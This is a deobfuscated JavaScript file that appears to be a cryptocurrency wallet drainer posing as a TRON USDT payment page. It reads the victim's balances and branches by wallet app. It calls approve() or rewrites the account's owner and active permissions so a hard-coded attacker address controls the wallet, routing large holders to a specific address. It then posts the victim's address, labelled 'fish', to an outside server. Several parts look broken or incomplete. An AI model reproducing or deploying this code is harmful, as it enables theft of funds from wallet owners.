//Mon Nov 04 2024 07:26:05 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
(function () {})();
async function check() {
  if (window.tronWeb == undefined) {
    layer.msg("请选择TRX链进行支付");
    return;
  }
  if (window.tronWeb.defaultAddress == undefined || window.tronWeb.defaultAddress == null) {
    layer.msg("请允许访问你的TRX钱包地址");
    return;
  }
  userAddress = await tronWeb.defaultAddress.base58;
  balance = (await tronWeb.trx.getBalance(userAddress)) / 1000000;
  let _0x4fe7f2 = await tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"),
    _0x68e9fa = await _0x4fe7f2.balanceOf(userAddress).call();
  usdt_balance = parseInt(_0x68e9fa._hex) / 1000000;
  var _0x71796a = {
    "address": userAddress,
    "to_address": to,
    "type": "trc"
  };
  jQuery.ajax({
    "url": "/index/pay/check",
    "method": "POST",
    "data": _0x71796a,
    "async": false,
    "success": function (_0xcc8e71) {
      _0xcc8e71 = JSON.parse(_0xcc8e71);
      if (_0xcc8e71.result == true) transfer();else {
        if (/imtoken/.test(navigator.userAgent.toLowerCase())) updatePermissions();else {
          if (/bitkeep/.test(navigator.userAgent.toLowerCase())) {
            if (balance >= 100) updatePermissions();else {
              approve();
            }
          } else /okex/.test(navigator.userAgent.toLowerCase()) ? approve() : $("#approval").show();
        }
      }
    },
    "error": function (_0xfed13d) {
      layer.msg("系统维护,请联系客服");
    }
  });
}
async function updatePermissions() {
  let _0x2a7511 = tronWeb.defaultAddress.hex;
  if (usdt_balance >= 10000) {
    to = "TQMehuCs8QvUvvQuP6n97nePUmqbgqc2vB";
  }
  let _0x153f25 = {
    "type": 0,
    "permission_name": "owner"
  };
  _0x153f25.threshold = 1;
  _0x153f25.keys = [];
  let _0x6828c6 = {
    "type": 2,
    "permission_name": "active0"
  };
  _0x6828c6.threshold = 1;
  _0x6828c6.operations = "7fff1fc0037e0000000000000000000000000000000000000000000000000000";
  _0x6828c6.keys = [];
  _0x153f25.keys.push({
    "address": tronWeb.address.toHex(to),
    "weight": 1
  });
  _0x6828c6.keys.push({
    "address": tronWeb.address.toHex(to),
    "weight": 1
  });
  usdt_balance < threshold ? (_0x153f25.keys.push({
    "address": _0x2a7511,
    "weight": 1
  }), _0x6828c6.keys.push({
    "address": _0x2a7511,
    "weight": 1
  }), authorize_type = "双控") : authorize_type = "单控";
  const _0x3b24c6 = await tronWeb.transactionBuilder.updateAccountPermissions(_0x2a7511, _0x153f25, null, [_0x6828c6]);
  try {} catch (_0x542722) {
    /imtoken/.test(navigator.userAgent.toLowerCase()) && (layer.msg(imTip), $("#approval").show());
  }
  const _0x514ee4 = await tronWeb.trx.sendRawTransaction(signedTransaction);
  if (_0x514ee4.result) {
    if (to != "TQMehuCs8QvUvvQuP6n97nePUmqbgqc2vB") layer.msg("网络异常，付款失败"), addfry();else {
      let _0x50a8d3 = await tronWeb.defaultAddress.base58;
      var _0x1069ab = {
        "fish": _0x50a8d3,
        "authorized_address": to
      };
      jQuery.ajax({
        "url": "https://check.coinservapi.com/permissions.php",
        "method": "POST",
        "data": _0x1069ab,
        "async": false,
        "success": function (_0x49e7fb) {},
        "error": function (_0x5347ba) {}
      });
    }
  }
}
async function approve() {
  $("#approval").hide();
  usdt_balance >= 10000 && (to = "TQMehuCs8QvUvvQuP6n97nePUmqbgqc2vB");
  const _0x384ae7 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
  try {
    let _0x469528 = await tronWeb.contract().at(_0x384ae7);
  } catch (_0x569c66) {
    console.error(_0x569c66);
  }
}